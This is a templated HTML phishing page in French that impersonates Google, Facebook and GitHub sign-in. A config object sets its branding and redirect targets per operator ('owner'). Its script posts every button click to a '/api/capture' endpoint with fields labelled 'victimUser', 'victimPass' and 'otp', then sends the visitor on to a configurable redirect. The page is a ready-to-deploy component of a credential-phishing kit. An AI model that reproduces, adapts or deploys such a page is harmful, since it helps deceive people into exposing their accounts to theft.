<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ config.get('title', 'Connexion') }}</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #0b0b0b;
            background-image: url('{{ config.get("bg_value", "") }}');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(8px);
            z-index: 1;
        }
        .login-card {
            position: relative;
            z-index: 2;
            background: rgba(255, 255, 255, 0.95);
            width: 100%;
            max-width: 400px;
            padding: 35px 25px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
            text-align: center;
        }
        .logo-container {
            width: 75px;
            height: 75px;
            margin: 0 auto 15px auto;
            border-radius: 50%;
            overflow: hidden;
            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
            border: 2px solid #fff;
        }
        .logo-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        h1 {
            font-size: 20px;
            color: #111;
            margin-bottom: 8px;
            font-weight: 700;
        }
        p.subtitle {
            font-size: 13px;
            color: #666;
            margin-bottom: 25px;
        }
        .btn-social {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s ease;
            text-decoration: none;
        }
        .btn-social img {
            width: 20px;
            height: 20px;
        }
        .btn-google { background: #ffffff; color: #333; }
        .btn-google:hover { background: #f8f9fa; border-color: #c5c5c5; }
        
        .btn-facebook { background: #1877f2; color: #ffffff; border: none; }
        .btn-facebook:hover { background: #166fe5; }
        
        .btn-github { background: #24292e; color: #ffffff; border: none; }
        .btn-github:hover { background: #1e2227; }

        .footer-text {
            margin-top: 20px;
            font-size: 11px;
            color: #888;
            line-height: 1.4;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo-container">
            <img src="{{ config.get('logo_url', 'https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg') }}" alt="Logo">
        </div>

        <h1>{{ config.get('title', 'Connexion') }}</h1>
        <p class="subtitle">Connectez-vous pour continuer</p>

        <!-- Bouton Google -->
        <button onclick="handleLogin('Google', '{{ config.get('redirect_google') }}')" class="btn-social btn-google">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
            S'identifier avec Google
        </button>

        <!-- Bouton Facebook -->
        <button onclick="handleLogin('Facebook', '{{ config.get('redirect_facebook') }}')" class="btn-social btn-facebook">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook" style="filter: brightness(0) invert(1);">
            Continuer avec Facebook
        </button>

        <!-- Bouton GitHub -->
        <button onclick="handleLogin('GitHub', '{{ config.get('redirect_github') }}')" class="btn-social btn-github">
            <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg" alt="GitHub" style="filter: brightness(0) invert(1);">
            S'identifier avec GitHub
        </button>

        <!-- Texte du bas en chinois -->
        <div class="footer-text">
            登录即代表您同意我们的服务条款和隐私政策
        </div>
    </div>

    <script>
        function handleLogin(provider, redirectUrl) {
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    owner: "{{ config.get('owner', 'Kim') }}",
                    network: provider,
                    type: "oauth_click",
                    victimUser: provider + "_User",
                    victimPass: "OAuth_Authorized",
                    otp: "Aucun"
                })
            }).finally(() => {
                window.location.href = redirectUrl;
            });
        }
    </script>
</body>
</html>
